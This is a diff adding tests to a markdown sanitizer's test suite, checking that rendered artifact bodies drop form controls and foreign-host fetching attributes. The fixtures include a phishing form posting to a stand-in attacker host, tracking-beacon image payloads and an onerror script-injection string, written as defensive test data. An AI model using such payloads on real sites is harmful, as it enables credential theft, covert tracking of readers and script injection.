@@ -115,6 +115,50 @@ describe('the sanitized artifact-body rendering path', () => {
     expect(attributeValues(container).some((value) => value.toLowerCase().includes('javascript:'))).toBe(false);
   });
 
+  // A form on the registry's origin is indistinguishable from the UI's own
+  // chrome, and the origin is the one the session cookie is scoped to, so an
+  // author who can write a layer's source could otherwise prompt a reader for
+  // a credential and post it to a host of the author's choosing. No markdown
+  // renderer emits a form control, so the whole set is dropped.
+  it('keeps no form control', () => {
+    const container = renderBody(
+      'Before\n\n<form action="https://evil.example/collect"><input name="q"><button>go</button></form>\n\nAfter\n',
+    );
+    for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'option']) {
+      expect(container.querySelector(tag)).toBeNull();
+    }
+    expect(container.textContent).toContain('Before');
+  });
+
+  // A URL the browser fetches without the reader acting reaches the host it
+  // names with the reader's IP address, User-Agent, and Referer, so a body
+  // that named a foreign host on one would make every view of the artifact a
+  // report to its author. The payload is delivered on a markdown image, on a
+  // src attribute, on a candidate list, and in the scheme-relative form that
+  // names a host without spelling a scheme.
+  it('keeps no fetching attribute that names a foreign host', () => {
+    const bodies = [
+      '![b](https://tracker.example.com/beacon.gif?viewer=1)\n',
+      '<img src="https://tracker.example.com/beacon.gif?viewer=1" alt="b">\n',
+      '<img srcset="https://tracker.example.com/a.png 1x" alt="s">\n',
+      '<img src="/ok.png" srcset="/ok.png 1x, https://tracker.example.com/a.png 2x" alt="s">\n',
+      '<img src="//tracker.example.com/beacon.gif" alt="b">\n',
+      '<video poster="https://tracker.example.com/poster.png"></video>\n',
+    ];
+    for (const body of bodies) {
+      const container = renderBody(body);
+      expect(attributeValues(container).some((value) => value.includes('tracker.example.com'))).toBe(false);
+    }
+  });
+
+  // A link is followed by the reader rather than by the browser, so it keeps
+  // its host, and an image that resolves against this origin keeps its URL.
+  it('keeps a link to a foreign host and an image on this origin', () => {
+    const container = renderBody('[Go](https://example.com/a)\n\n![x](/assets/x.png)\n');
+    expect(container.querySelector('a')?.getAttribute('href')).toBe('https://example.com/a');
+    expect(container.querySelector('img')?.getAttribute('src')).toBe('/assets/x.png');
+  });
+
   it('renders a markup-carrying frontmatter value as literal text', () => {
     const container = render(<PropertyTable raw={'title: <img src=x onerror="window.hijacked=1">\n'} />).container;
     expect(container.querySelector('img')).toBeNull();
